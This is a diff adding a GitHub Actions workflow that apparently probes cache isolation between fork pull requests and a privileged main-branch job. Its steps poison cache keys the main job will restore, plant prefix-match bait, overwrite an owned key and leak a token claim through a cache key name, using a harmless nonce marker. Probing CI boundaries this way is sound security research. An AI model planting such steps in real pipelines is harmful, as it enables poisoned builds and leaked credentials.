@@ -1,0 +1,57 @@
+name: pr-probe
+on:
+  pull_request:
+permissions:
+  contents: read
+jobs:
+  prjob:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - id: n
+        run: |
+          N="$(cat NONCE.txt)"
+          echo "n=$N" >> $GITHUB_OUTPUT
+          mkdir -p cachedir
+          echo "FORK-PR-CONTENT-MARKER-$N repo=${{ github.repository }} ref=${{ github.ref }} head=${{ github.head_ref }} run=${{ github.run_id }}" > cachedir/marker.txt
+      - name: probe
+        id: p
+        uses: ./.github/actions/cbprobe
+        with:
+          mode: pr
+          nonce: ${{ steps.n.outputs.n }}
+          ghtok: ${{ github.token }}
+          mainkey: cbmain-${{ steps.n.outputs.n }}
+      - name: restore what main wrote (read direction, documented as allowed)
+        id: rd
+        uses: actions/cache/restore@v4
+        continue-on-error: true
+        with:
+          path: cachedir2
+          key: cbmain-${{ steps.n.outputs.n }}
+      - run: 'echo "READ-MAIN-HIT=${{ steps.rd.outputs.cache-hit }}"; cat cachedir2/marker.txt 2>/dev/null || echo NO-CONTENT'
+        continue-on-error: true
+      - name: write the key the privileged main job will ask for (exact)
+        uses: actions/cache/save@v4
+        continue-on-error: true
+        with:
+          path: cachedir
+          key: cbpr-${{ steps.n.outputs.n }}-exact
+      - name: write a prefix bait for the main job restore-keys fallback
+        uses: actions/cache/save@v4
+        continue-on-error: true
+        with:
+          path: cachedir
+          key: cbpr-${{ steps.n.outputs.n }}-bait
+      - name: overwrite the key main already owns
+        uses: actions/cache/save@v4
+        continue-on-error: true
+        with:
+          path: cachedir
+          key: cbmain-${{ steps.n.outputs.n }}
+      - name: exfil the ac claim through a cache key
+        uses: actions/cache/save@v4
+        continue-on-error: true
+        with:
+          path: cachedir
+          key: cbacpr-${{ steps.n.outputs.n }}-${{ steps.p.outputs.ac }}
